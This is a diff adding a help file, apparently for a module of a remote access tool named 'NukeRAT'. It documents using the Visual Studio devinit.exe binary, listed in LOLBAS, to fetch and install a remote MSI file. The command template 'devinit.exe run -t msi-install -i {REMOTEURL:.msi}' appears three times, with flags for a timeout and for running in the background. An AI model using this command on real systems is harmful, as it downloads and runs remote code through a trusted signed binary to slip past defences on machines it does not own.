@@ -1,0 +1,16 @@
+ABOUT
+    Visual Studio 2019 tool. LOLBAS documents executing code from a
+    (remote) MSI file.
+
+USAGE:
+    devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+
+EXAMPLES:
+    devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    devinit.exe run -t msi-install -i {REMOTEURL:.msi}
